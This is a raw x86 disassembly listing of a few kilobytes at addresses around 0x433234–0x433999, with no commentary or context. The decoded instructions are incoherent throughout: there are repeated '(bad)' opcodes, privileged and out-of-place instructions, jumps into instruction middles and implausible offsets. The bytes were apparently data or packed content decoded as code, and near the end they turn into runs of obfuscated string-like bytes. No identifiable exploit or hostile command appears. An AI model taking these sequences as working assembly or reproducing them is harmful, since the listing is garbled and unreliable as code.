  433234:	les    esi,FWORD PTR [ebp-0x7b]
  433237:	mov    edi,eax
  433239:	or     al,0x4d
  43323b:	dec    ebp
  43323c:	mov    eax,ebp
  43323e:	in     al,0xf2
  433240:	dec    ebp
  433241:	dec    DWORD PTR [ecx+0x4dc7e045]
  433247:	fmul   DWORD PTR [ecx+0x4df8f085]
  43324d:	inc    ebp
  43324e:	mov    DWORD PTR [ebx],esi
  433250:	fadd   QWORD PTR [ebx]
  433252:	dec    ebp
  433253:	push   eax
  433254:	xor    eax,DWORD PTR [ebp+0x3]
  433257:	push   eax
  433258:	mov    DWORD PTR [eax+ebx*8],ebx
  43325b:	push   esi
  43325d:	mov    eax,DWORD PTR [eax]
  43325f:	lock cmp eax,0xf84e85c0
  433265:	inc    ebp
  433266:	test   BYTE PTR [ebx],dh
  433268:	add    DWORD PTR [ebx],eax
  43326a:	add    BYTE PTR [eax+0x4d],dl
  43326d:	jne    0x4332a2
  43326f:	lea    ecx,[ebx-0x7617fc44]
  433275:	div    ah
  433277:	inc    DWORD PTR [ebp+0x45]
  43327a:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433280:	jb     0x43320d
  433282:	add    BYTE PTR [eax*2-0x17ba743f],cl
  433289:	mov    ecx,DWORD PTR [ebp-0x10]
  43328c:	xor    ecx,DWORD PTR [ebp+0x3]
  43328f:	mov    edi,DWORD PTR [ebx]
  433291:	adc    BYTE PTR [ebp+0x41],dh
  433294:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43329a:	ret    
  43329b:	push   ss
  43329c:	push   0x45
  43329e:	lea    ecx,[ebx+0x4de80cb0]
  4332a4:	sti    
  4332a5:	add    edi,edi
  4332a7:	or     BYTE PTR [ebp+0x4d],al
  4332aa:	mov    ebp,DWORD PTR [ebx]
  4332ac:	xor    ebp,ecx
  4332ae:	mov    al,BYTE PTR [edx]
  4332b0:	add    eax,0xc7200
  4332b5:	jne    0x433304
  4332b7:	lea    esi,[ebx]
  4332b9:	mov    al,0xf
  4332bb:	call   0xf2980
  4332c0:	shl    DWORD PTR [ecx],0x84
  4332c3:	pushf  
  4332c4:	add    DWORD PTR [ecx+0x4545d000],ecx
  4332ca:	mov    esi,DWORD PTR [edx]
  4332cc:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4332d3:	test   DWORD PTR [eax],eax
  4332d5:	clc    
  4332d6:	dec    ebp
  4332d7:	inc    ebp
  4332d8:	xor    edi,DWORD PTR [edi+ecx*1]
  4332db:	pushf  
  4332dc:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  4332e3:	lea    eax,[ecx]
  4332e5:	int3   
  4332e6:	add    BYTE PTR [ebp+0x45],cl
  4332e9:	lea    ecx,[ebx-0x75b2cc38]
  4332ef:	lea    eax,ds:0x4d72c4
  4332f5:	mov    ecx,DWORD PTR [ebp-0x4]
  4332f8:	xor    ecx,edi
  4332fa:	bswap  ebx
  4332fc:	ror    BYTE PTR [ebp-0x35],0xe9
  433300:	rol    DWORD PTR [ecx],0x84
  433303:	add    BYTE PTR [ecx],al
  433305:	xor    eax,DWORD PTR [eax]
  433307:	pushf  
  433308:	inc    ebp
  433309:	jnp    0x8a43670c
  43330f:	mov    eax,DWORD PTR ds:0xcf72e8
  433315:	lock dec ebp
  433317:	retf   
  433318:	xor    ecx,DWORD PTR [ebp+0xf]
  43331b:	mov    eax,eax
  43331d:	fmul   st,st(3)
  43331f:	test   ecx,0x19b8484
  433325:	xor    al,BYTE PTR [eax]
  433327:	mov    DWORD PTR [ebp-0x28],eax
  43332a:	mov    eax,DWORD PTR [ebp+0x33]
  43332d:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433333:	ret    
  433334:	add    al,cl
  433336:	dec    ebp
  433337:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  43333d:	add    ecx,DWORD PTR ds:0xc7250
  433343:	inc    ebp
  433344:	rcl    DWORD PTR [eax+0x4d],0x2b
  433348:	mov    edi,edi
  43334a:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433350:	jb     0x433319
  433352:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  433359:	mov    esi,DWORD PTR [ebx]
  43335b:	cld    
  43335c:	mov    cl,bh
  43335e:	or     eax,0x372b6
  433363:	cmp    ecx,eax
  433365:	jne    0x4333e2
  43336b:	mov    eax,DWORD PTR [ebp-0x20]
  43336e:	mov    eax,DWORD PTR [eax]
  433370:	xor    eax,edi
  433372:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  433379:	mov    ecx,DWORD PTR [ebp-0x4]
  43337c:	mov    ecx,edi
  43337e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433384:	jb     0x433395
  433386:	add    BYTE PTR [edi-0x3f],dl
  433389:	add    BYTE PTR [ebp-0x75],cl
  43338c:	mov    esi,eax
  43338e:	xor    eax,DWORD PTR [eax]
  433390:	mov    al,bh
  433392:	or     eax,0x4b7284
  433397:	xor    al,cl
  433399:	mov    ecx,DWORD PTR [ebp-0x4]
  43339c:	mov    ecx,edi
  43339e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4333a4:	jb     0x4333b5
  4333a6:	add    BYTE PTR [edi],dh
  4333a8:	enter  0x8500,0x8b
  4333ac:	add    ah,bl
  4333ae:	add    BYTE PTR [eax],al
  4333b0:	inc    ebp
  4333b1:	(bad)  
  4333b2:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  4333b9:	mov    esi,DWORD PTR [edx-0x4]
  4333bc:	add    bh,cl
  4333be:	dec    ebp
  4333bf:	mov    dh,0x8b
  4333c1:	add    esi,DWORD PTR [ebx]
  4333c3:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4333c9:	add    BYTE PTR [eax],al
  4333cb:	mov    eax,ecx
  4333cd:	loopne 0x43341c
  4333cf:	add    BYTE PTR [ebx-0x757bcc39],cl
  4333d5:	dec    ebx
  4333d6:	or     eax,0x8b7232
  4333db:	in     al,0xc1
  4333dd:	or     DWORD PTR [ebp-0x31],ecx
  4333e0:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  4333e7:	xor    dh,BYTE PTR [edx-0x75]
  4333ea:	add    al,dh
  4333ec:	enter  0x4f09,0xcf
  4333f0:	inc    ebp
  4333f1:	mov    WORD PTR [ebx-0x75cdccb5],cs
  4333f7:	or     al,BYTE PTR ds:0xe4728b
  4333fd:	or     DWORD PTR [ebp-0x31],ecx
  433400:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  433407:	cmp    dh,BYTE PTR [edx+0xf]
  43340a:	add    bl,dl
  43340c:	rol    DWORD PTR [eax],0x4d
  43340f:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433415:	(bad)  
  433416:	or     eax,0x4b7284
  43341b:	xor    al,cl
  43341d:	mov    ecx,DWORD PTR [ebp-0x20]
  433420:	mov    ecx,DWORD PTR [ecx]
  433422:	xor    ecx,edi
  433424:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  43342b:	xor    cl,al
  43342d:	mov    ecx,DWORD PTR [edi]
  43342f:	fadd   QWORD PTR [ebp+0x9]
  433432:	call   0xffd02f06
  433437:	dec    ebx
  433438:	dec    ebp
  433439:	xor    bh,BYTE PTR [ebx]
  43343b:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  43343f:	loopne 0x43343d
  433441:	or     edi,eax
  433443:	iret   
  433444:	ret    
  433445:	mov    WORD PTR [ebp+0x4f],es
  433448:	mov    esi,DWORD PTR [edx]
  43344a:	call   0x8452fb89
  43344f:	(bad)  
  433450:	fwait
  433451:	add    BYTE PTR [edx],dh
  433453:	mov    esi,DWORD PTR [ebx]
  433455:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43345b:	test   BYTE PTR [ebx],dh
  43345d:	dec    ebx
  43345e:	add    esi,DWORD PTR [edx]
  433460:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  433466:	dec    edi
  433468:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  43346f:	xor    al,BYTE PTR [ebx]
  433471:	mov    edi,DWORD PTR [ebx]
  433473:	in     al,0x75
  433475:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43347b:	dec    ebx
  43347c:	xor    esi,DWORD PTR [edx]
  43347e:	lea    ecx,[edx]
  433480:	or     BYTE PTR [ebx+0x900f072],cl
  433486:	ja     0x433457
  433488:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  43348f:	cmp    ch,al
  433491:	jne    0x433486
  433493:	mov    edi,edi
  433495:	fadd   QWORD PTR [ebp+0x0]
  433498:	mov    eax,edi
  43349a:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  4334a1:	mov    edx,DWORD PTR [ebx]
  4334a3:	in     al,0x45
  4334a5:	or     DWORD PTR [ebx],esi
  4334a7:	iret   
  4334a8:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  4334af:	xor    dl,BYTE PTR [eax-0x75]
  4334b2:	sbb    al,0xe0
  4334b4:	dec    DWORD PTR [ecx]
  4334b6:	mov    ecx,edi
  4334b8:	in     al,dx
  4334b9:	mov    eax,es
  4334bb:	dec    ebx
  4334bc:	mov    DWORD PTR [edx],esi
  4334be:	fmul   QWORD PTR [edx]
  4334c0:	jne    0x43344d
  4334c2:	(bad)  
  4334c3:	(bad)  
  4334c5:	or     DWORD PTR [ebp-0x31],eax
  4334c8:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  4334cf:	cmp    bh,bh
  4334d1:	jne    0x433518
  4334d3:	lea    ecx,[ebx-0x38372750]
  4334d9:	inc    ebx
  4334db:	mov    eax,ecx
  4334dd:	mov    eax,0xa00c111
  4334e2:	jne    0x433529
  4334e4:	mov    esi,DWORD PTR [ebx]
  4334e6:	test   al,0x3
  4334e8:	inc    ebp
  4334e9:	mov    DWORD PTR [eax-0xc],edx
  4334ec:	loop   0x433533
  4334ee:	push   DWORD PTR [ebx]
  4334f0:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  4334f6:	add    DWORD PTR [eax],eax
  4334f8:	mov    eax,edi
  4334fa:	lods   al,BYTE PTR ds:[esi]
  4334fb:	dec    ebp
  4334fc:	inc    ebp
  4334fd:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433503:	retf   
  433504:	mov    edx,ecx
  433506:	adc    al,0x84
  433508:	(bad)  
  433509:	std    
  43350a:	ret    
  43350b:	jmp    FWORD PTR [edi-0x2b7474bb]
  433511:	hlt    
  433512:	rol    edi,0x82
  433515:	ret    
  433516:	cld    
  433517:	enter  0x11ff,0x45
  43351b:	inc    ebp
  43351c:	pop    edi
  43351d:	mov    ebx,DWORD PTR [ebx+0x14]
  433520:	ret    0xc7
  433523:	test   BYTE PTR [ebx+0x4532519b],cl
  433529:	jmp    0x4334b6
  43352b:	push   0x8
  43352d:	call   DWORD PTR [esi]
  43352f:	in     al,dx
  433530:	add    BYTE PTR [ebp+0x1],0x50
  433534:	add    bh,ah
  433536:	add    bh,bh
  433538:	icebp  
  433539:	mov    ecx,DWORD PTR [eax]
  43353b:	cld    
  43353c:	pop    es
  43353d:	dec    ebp
  43353e:	shl    DWORD PTR [ebx],0x72
  433541:	add    eax,DWORD PTR [eax]
  433543:	cmp    edx,ecx
  433545:	je     0x433557
  433547:	mov    esi,DWORD PTR [ebp-0x4]
  43354a:	inc    edi
  43354c:	or     al,0xc3
  43354e:	jmp    FWORD PTR [edx-0x18]
  433551:	(bad)  
  433552:	sti    
  433553:	cwde   
  433554:	(bad)  
  433555:	call   0xffa12e60
  43355a:	or     al,0x45
  43355c:	push   ebp
  43355d:	sub    esp,0x18
  433560:	push   ebx
  433561:	inc    ebp
  433562:	mov    edi,edi
  433564:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43356b:	test   al,0x54
  43356d:	inc    ebp
  43356e:	push   ecx
  43356f:	push   eax
  433570:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  433576:	add    ah,bh
  433578:	(bad)  
  433579:	dec    ebp
  43357a:	add    DWORD PTR [ebx],esi
  43357c:	inc    ebp
  43357d:	add    ecx,DWORD PTR [ebx+0x74943b]
  433583:	push   0xffffff8b
  433585:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43358b:	add    eax,DWORD PTR [ecx]
  43358d:	or     BYTE PTR [eax],al
  43358f:	call   0xff852d94
  433594:	mov    eax,DWORD PTR [ebp+0x14]
  433597:	mov    ecx,DWORD PTR [ecx+0x801ac]
  43359d:	inc    ebp
  43359e:	dec    ecx
  43359f:	add    ebp,DWORD PTR [edx+0x14]
  4335a2:	push   0x8b3045
  4335a7:	call   0x33ad831c
  4335ac:	inc    DWORD PTR [ebx]
  4335ae:	mov    DWORD PTR [edi],ecx
  4335b0:	mov    eax,ecx
  4335b2:	or     BYTE PTR [ebp-0x3d],cl
  4335b5:	cmp    eax,edi
  4335b7:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4335bc:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4335c2:	adc    al,0xc9
  4335c4:	inc    ebp
  4335c5:	adc    BYTE PTR [eax+0x55],dl
  4335c8:	jne    0x4335b6
  4335ca:	call   0xff54355a
  4335cf:	dec    ebp
  4335d0:	inc    ebp
  4335d1:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4335d7:	add    BYTE PTR [ebx],bh
  4335d9:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4335dd:	push   esp
  4335de:	or     al,0x51
  4335e0:	dec    ebp
  4335e1:	xor    DWORD PTR [ebx],0xf32039b
  4335e7:	cmp    eax,DWORD PTR [ebp+0x74]
  4335ea:	mov    edi,edi
  4335ec:	pop    edi
  4335ed:	adc    BYTE PTR [ebx+0x75],bl
  4335f0:	ret    0x50
  4335f3:	mov    edx,DWORD PTR ss:[edi-0x7d]
  4335f7:	(bad)  
  4335f8:	clc    
  4335f9:	mov    esp,ebp
  4335fb:	pop    ecx
  4335fc:	mov    ecx,0xf80085c2
  433601:	mov    ecx,DWORD PTR [ecx+edx*2]
  433604:	push   esi
  433605:	push   esi
  433606:	(bad)  
  433607:	lock add DWORD PTR [ebp+0x44],eax
  43360b:	mov    edx,DWORD PTR [eax]
  43360d:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433611:	or     BYTE PTR [edi+eax*1+0x51],dl
  433615:	ret    
  433616:	xor    ebx,DWORD PTR [ebx+0x37232be]
  43361c:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433622:	or     al,0x80
  433624:	jge    0x433627
  433626:	mov    DWORD PTR [eax],eax
  433628:	and    al,0x8
  43362a:	cmp    DWORD PTR [ebp+0x10],eax
  43362d:	mov    edx,DWORD PTR [esi]
  43362f:	xchg   esp,eax
  433630:	dec    esp
  433631:	add    BYTE PTR [eax],dl
  433633:	mov    ecx,edx
  433635:	add    edx,DWORD PTR [esp+edi*1+0x8]
  433639:	dec    ebp
  43363a:	into   
  43363b:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433641:	mov    edx,DWORD PTR [eax+0x14]
  433644:	das    
  433645:	add    al,0x45
  433647:	add    BYTE PTR [ebp+0x0],dh
  43364a:	mov    edi,edi
  43364c:	and    al,0x50
  43364e:	mov    eax,DWORD PTR [eax]
  433650:	and    al,0xd1
  433652:	xor    eax,DWORD PTR [esi]
  433654:	lea    eax,[ebp+0x8]
  433657:	xor    esi,DWORD PTR [edx+0x3]
  43365a:	add    BYTE PTR [ecx+0x4510fc44],cl
  433660:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  433666:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433670:	cmp    al,0xff
  433672:	pushf  
  433673:	mov    edi,edi
  433675:	or     BYTE PTR [esi+ecx*1],cl
  433678:	jne    0x43363d
  43367a:	call   0xc3646
  43367f:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433683:	mov    ebx,DWORD PTR [eax]
  433685:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  433689:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  433691:	pop    esi
  433692:	and    al,0xc9
  433694:	and    al,0x10
  433696:	call   DWORD PTR [ebp-0x73]
  433699:	in     al,dx
  43369a:	jmp    esp
  43369c:	je     0x433621
  43369e:	call   DWORD PTR [eax]
  4336a0:	and    al,0x31
  4336a2:	call   0xffcd3543
  4336a7:	and    al,0x44
  4336a9:	push   edi
  4336aa:	or     al,0x41
  4336ac:	pop    esi
  4336ad:	mov    ebp,esp
  4336af:	and    al,0xc2
  4336b1:	mov    eax,DWORD PTR [eax]
  4336b3:	and    al,0x85
  4336b5:	mov    edx,0x733080e
  4336ba:	jne    0x4336b6
  4336bc:	test   DWORD PTR [ebx+0x3083275],ebx
  4336c2:	dec    DWORD PTR [ecx-0x74dbdb15]
  4336c8:	sbb    BYTE PTR [esp+edx*1],cl
  4336cb:	jl     0x4336cc
  4336cd:	adc    al,0x24
  4336cf:	dec    ebp
  4336d0:	mov    esi,DWORD PTR [ebp+0xc]
  4336d3:	mov    ecx,DWORD PTR [eax]
  4336d5:	and    al,0x39
  4336d7:	xor    ebx,DWORD PTR [ebx+ecx*4]
  4336da:	or     BYTE PTR [eax+edx*1],ah
  4336dd:	add    eax,DWORD PTR [edi+ecx*1+0x4c24ca32]
  4336e4:	clc    
  4336e5:	jmp    0x433683
  4336e7:	adc    al,bh
  4336e9:	inc    esp
  4336ea:	je     0x433738
  4336ec:	and    al,0xc2
  4336ee:	je     0x43368b
  4336f0:	mov    ecx,DWORD PTR [ecx+0x687d685d]
  4336f6:	dec    DWORD PTR [ecx+0x235fbf08]
  4336fc:	sbb    al,0x10
  4336fe:	add    BYTE PTR [esi+edi*1+0x10],cl
  433702:	add    BYTE PTR [ebx+0xb],dh
  433705:	adc    BYTE PTR [eax],al
  433707:	mov    WORD PTR ds:0x3d450010,?
  43370d:	adc    BYTE PTR [eax],al
  43370f:	add    DWORD PTR [eax+edx*1],esp
  433712:	add    BYTE PTR [edx+0x6],cl
  433715:	adc    BYTE PTR [eax],al
  433717:	sub    dx,WORD PTR [eax]
  43371a:	add    bh,dl
  43371c:	imul   edx,DWORD PTR [eax],0x10302300
  433722:	add    BYTE PTR [esi-0x4ffef89],dl
  433728:	ss inc ebx
  43372a:	add    bh,bh
  43372c:	ss inc ebx
  43372e:	add    BYTE PTR [ebx],al
  433730:	aaa    
  433731:	inc    ebx
  433732:	add    BYTE PTR [edi],al
  433734:	aaa    
  433735:	inc    ebx
  433736:	add    BYTE PTR [ebx],cl
  433738:	aaa    
  433739:	inc    ebx
  43373a:	add    BYTE PTR [edi],cl
  43373c:	aaa    
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [ebx],dl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [edi],dl
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [ebx],bl
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [edi],bl
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [ebx],ah
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [eax+0x9001011],ah
  433758:	jo     0x43376a
  43375a:	add    BYTE PTR ds:0xd7001027,ch
  433760:	pop    eax
  433761:	adc    BYTE PTR [eax],al
  433763:	push   es
  433764:	adc    al,0x10
  433766:	add    BYTE PTR [esi+0x33001031],ah
  43376c:	ins    BYTE PTR es:[edi],dx
  43376d:	adc    BYTE PTR [eax],al
  43376f:	jb     0x4337b0
  433771:	adc    BYTE PTR [eax],al
  433773:	push   ebx
  433774:	aaa    
  433775:	inc    ebx
  433776:	add    BYTE PTR [edi+0x37],dl
  433779:	inc    ebx
  43377a:	add    BYTE PTR [ebx+0x37],bl
  43377d:	inc    ebx
  43377e:	add    BYTE PTR [edi+0x37],bl
  433781:	inc    ebx
  433782:	add    BYTE PTR [ebx+0x37],ah
  433785:	inc    ebx
  433786:	add    BYTE PTR [edi+0x37],ah
  433789:	inc    ebx
  43378a:	add    BYTE PTR [ebx+0x37],ch
  43378d:	inc    ebx
  43378e:	add    BYTE PTR [edi+0x37],ch
  433791:	inc    ebx
  433792:	add    dh,cl
  433794:	jge    0x4337a6
  433796:	add    BYTE PTR [esi-0x3dffef8e],dl
  43379c:	or     dl,BYTE PTR [eax]
  43379e:	add    dh,bl
  4337a0:	sub    dl,BYTE PTR [eax]
  4337a2:	add    BYTE PTR [edx],bl
  4337a4:	ins    BYTE PTR es:[edi],dx
  4337a5:	adc    BYTE PTR [eax],al
  4337a7:	addr16 jno 0x4337ba
  4337aa:	add    BYTE PTR [ebp+0x3d],ch
  4337ad:	adc    BYTE PTR [eax],al
  4337af:	lds    esp,FWORD PTR [eax+0x10]
  4337b2:	add    BYTE PTR [ebx-0x68ffbcc9],dl
  4337b8:	aaa    
  4337b9:	inc    ebx
  4337ba:	add    BYTE PTR [ebx-0x60ffbcc9],bl
  4337c0:	aaa    
  4337c1:	inc    ebx
  4337c2:	add    BYTE PTR [ebx-0x58ffbcc9],ah
  4337c8:	aaa    
  4337c9:	inc    ebx
  4337ca:	add    BYTE PTR [ebx-0x50ffbcc9],ch
  4337d0:	aaa    
  4337d1:	inc    ebx
  4337d2:	add    BYTE PTR [esp+edx*1],bh
  4337d5:	adc    BYTE PTR [eax],al
  4337d7:	clc    
  4337d8:	cmp    dl,BYTE PTR [eax]
  4337da:	add    BYTE PTR [ecx],ah
  4337dc:	pop    ds
  4337dd:	adc    BYTE PTR [eax],al
  4337df:	mov    edi,0x6001073
  4337e4:	adc    al,0x10
  4337e6:	add    BYTE PTR [ecx+0x34],bh
  4337e9:	adc    BYTE PTR [eax],al
  4337eb:	cmp    edi,DWORD PTR [eax+edx*1+0x0]
  4337ef:	shl    DWORD PTR [edx+0x10],1
  4337f2:	add    bl,dl
  4337f4:	aaa    
  4337f5:	inc    ebx
  4337f6:	add    bh,dl
  4337f8:	aaa    
  4337f9:	inc    ebx
  4337fa:	add    bl,bl
  4337fc:	aaa    
  4337fd:	inc    ebx
  4337fe:	add    bh,bl
  433800:	aaa    
  433801:	inc    ebx
  433802:	add    bl,ah
  433804:	aaa    
  433805:	inc    ebx
  433806:	add    bh,ah
  433808:	aaa    
  433809:	inc    ebx
  43380a:	add    bl,ch
  43380c:	aaa    
  43380d:	inc    ebx
  43380e:	add    bh,ch
  433810:	aaa    
  433811:	inc    ebx
  433812:	add    BYTE PTR [ebp+0x14],al
  433815:	adc    BYTE PTR [eax],al
  433817:	fwait
  433818:	pop    ds
  433819:	adc    BYTE PTR [eax],al
  43381b:	jnp    0x433840
  43381d:	adc    BYTE PTR [eax],al
  43381f:	pop    esi
  433820:	adc    BYTE PTR cs:[eax],al
  433823:	popf   
  433824:	jno    0x433836
  433826:	add    ah,bl
  433828:	inc    ebp
  433829:	adc    BYTE PTR [eax],al
  43382b:	sbb    edx,DWORD PTR [edx+0x10]
  43382e:	add    BYTE PTR [edx+0x13001029],bl
  433834:	cmp    BYTE PTR [ebx+0x0],al
  433837:	pop    ss
  433838:	cmp    BYTE PTR [ebx+0x0],al
  43383b:	sbb    edi,DWORD PTR [eax]
  43383d:	inc    ebx
  43383e:	add    BYTE PTR [edi],bl
  433840:	cmp    BYTE PTR [ebx+0x0],al
  433843:	and    edi,DWORD PTR [eax]
  433845:	inc    ebx
  433846:	add    BYTE PTR [edi],ah
  433848:	cmp    BYTE PTR [ebx+0x0],al
  43384b:	sub    edi,DWORD PTR [eax]
  43384d:	inc    ebx
  43384e:	add    BYTE PTR [edi],ch
  433850:	cmp    BYTE PTR [ebx+0x0],al
  433853:	push   esp
  433854:	xor    al,0x4b
  433856:	aaa    
  433857:	pop    edi
  433858:	inc    edx
  433859:	dec    ebx
  43385a:	xor    DWORD PTR [ecx],edi
  43385c:	push   edi
  43385d:	add    BYTE PTR [ecx+0x39],cl
  433860:	xor    al,0x5f
  433862:	pop    ecx
  433863:	inc    edi
  433864:	push   edx
  433865:	pop    edi
  433866:	dec    edx
  433867:	xor    al,BYTE PTR [edx+0x30]
  43386a:	push   ebx
  43386b:	add    BYTE PTR [ecx+0x4a],cl
  43386e:	cmp    BYTE PTR [edi+0x38],bl
  433871:	xor    al,0x43
  433873:	xor    bl,BYTE PTR [eax+0x36]
  433876:	pop    edi
  433877:	inc    ebx
  433878:	add    BYTE PTR [edx+0x33],cl
  43387b:	dec    ebp
  43387c:	cmp    BYTE PTR [edi+0x53],bl
  43387f:	xor    DWORD PTR [eax],edi
  433881:	pop    edx
  433882:	pop    edi
  433883:	xor    BYTE PTR [edx+0x52],cl
  433886:	inc    ecx
  433887:	add    BYTE PTR [edx+0x42],al
  43388a:	inc    ebp
  43388b:	pop    edi
  43388c:	cmp    DWORD PTR [eax],edi
  43388e:	push   ebp
  43388f:	inc    edx
  433890:	xor    eax,0x5244505f
  433895:	xor    BYTE PTR [eax],al
  433897:	inc    edx
  433898:	inc    esp
  433899:	inc    edx
  43389a:	cmp    DWORD PTR [edi+0x52],ebx
  43389d:	dec    esp
  43389e:	inc    ebp
  43389f:	add    BYTE PTR [ebx+0x37],dl
  4338a2:	push   esp
  4338a3:	xor    BYTE PTR [edi+0x55],bl
  4338a6:	push   ebx
  4338a7:	aaa    
  4338a8:	dec    ebp
  4338a9:	pop    edi
  4338aa:	xor    ecx,DWORD PTR [edx+0x4e]
  4338ad:	dec    ebx
  4338ae:	add    BYTE PTR [edx+0x47],cl
  4338b1:	inc    edi
  4338b2:	xor    eax,0x534e5f32
  4338b7:	push   esp
  4338b8:	pop    edi
  4338b9:	push   esp
  4338ba:	inc    edx
  4338bb:	add    BYTE PTR [ebx+0x4d],al
  4338be:	xor    BYTE PTR [edi+0x47],bl
  4338c1:	cmp    DWORD PTR [ecx+0x5f],ebx
  4338c4:	push   eax
  4338c5:	push   ecx
  4338c6:	push   ecx
  4338c7:	pop    edi
  4338c8:	inc    ebx
  4338c9:	push   edi
  4338ca:	push   esi
  4338cb:	add    BYTE PTR [ecx+0x57],cl
  4338ce:	inc    ebp
  4338cf:	pop    edi
  4338d0:	pop    ecx
  4338d1:	push   edx
  4338d2:	inc    edx
  4338d3:	pop    edi
  4338d4:	inc    edi
  4338d5:	add    BYTE PTR [ebx+0x51],dl
  4338d8:	cmp    DWORD PTR ds:0x4d305f33,esi
  4338de:	inc    edi
  4338df:	xor    edx,DWORD PTR [edx+0x34]
  4338e2:	pop    edi
  4338e3:	pop    edx
  4338e4:	cmp    BYTE PTR [eax],al
  4338e6:	inc    edi
  4338e7:	xor    esi,DWORD PTR ds:0x5451585f
  4338ed:	dec    esp
  4338ee:	add    BYTE PTR [edi+esi*1+0x34],cl
  4338f2:	pop    edi
  4338f3:	cmp    BYTE PTR [edi+0x49],dl
  4338f6:	xor    eax,0x5700505f
  4338fb:	cmp    DWORD PTR [edi+ebx*2+0x50],eax
  4338ff:	dec    esi
  433900:	dec    edx
  433901:	cmp    BYTE PTR [eax],al
  433903:	pop    edx
  433904:	dec    ebx
  433905:	xor    eax,0x4f5f3131
  43390a:	xor    dh,BYTE PTR [ecx]
  43390c:	pop    edi
  43390d:	inc    ebp
  43390e:	push   esp
  43390f:	inc    esp
  433910:	inc    ebp
  433911:	add    BYTE PTR [edi+0x55],dl
  433914:	cmp    DWORD PTR [edi+0x5a],ebx
  433917:	push   edx
  433918:	inc    edi
  433919:	xor    DWORD PTR [ebp+0x0],ecx
  43391c:	pop    edx
  43391d:	dec    ecx
  43391e:	dec    ebp
  43391f:	ss pop edi
  433921:	pop    edx
  433922:	push   edx
  433923:	cmp    BYTE PTR [esi+0x30],dl
  433926:	pop    edi
  433927:	push   ecx
  433928:	dec    esi
  433929:	add    BYTE PTR [ebx+0x32],dl
  43392c:	inc    ebx
  43392d:	cmp    BYTE PTR [edi+0x52],bl
  433930:	dec    ecx
  433931:	xor    BYTE PTR [eax],al
  433933:	inc    edi
  433934:	xor    eax,0x314f5f4b
  433939:	xor    DWORD PTR [edi+0x38],ebx
  43393c:	push   ebp
  43393d:	add    BYTE PTR [edi+0x4b],al
  433940:	xor    bl,BYTE PTR [edi+0x43]
  433943:	push   ebp
  433944:	cmp    DWORD PTR [ebp+0x4b],ecx
  433947:	ss pop edi
  433949:	pop    edx
  43394a:	push   edi
  43394b:	inc    esp
  43394c:	xor    BYTE PTR [eax],al
  43394e:	dec    ecx
  43394f:	inc    edi
  433950:	xor    eax,0x3058555f
  433955:	dec    ebx
  433956:	pop    edi
  433957:	push   edi
  433958:	add    BYTE PTR [eax+0x0],bl
  43395b:	inc    edi
  43395c:	add    BYTE PTR [edx+0x0],al
  43395f:	pop    edi
  433960:	add    BYTE PTR [ebx],dh
  433962:	add    BYTE PTR [eax],bh
  433964:	add    BYTE PTR [ebx+0x0],cl
  433967:	xor    eax,0x33003500
  43396c:	add    BYTE PTR [eax],dh
  43396e:	add    BYTE PTR [edi+0x0],bl
  433971:	push   esp
  433972:	add    BYTE PTR [ebp+0x0],cl
  433975:	xor    BYTE PTR [eax],al
  433977:	add    BYTE PTR [eax],al
  433979:	inc    esi
  43397a:	add    BYTE PTR [eax+0x0],bl
  43397d:	xor    BYTE PTR [eax],al
  43397f:	pop    edi
  433980:	add    BYTE PTR [ecx],dh
  433982:	add    BYTE PTR [ebx+0x0],al
  433985:	xor    eax,0x5f003100
  43398a:	add    BYTE PTR [ecx+0x0],al
  43398d:	xor    eax,DWORD PTR [eax]
  43398f:	add    BYTE PTR [eax],al
  433991:	push   ebx
  433992:	add    BYTE PTR [ebx+0x0],dl
  433995:	dec    eax
  433996:	add    BYTE PTR [edi+0x0],bl
  433999:	push   esp
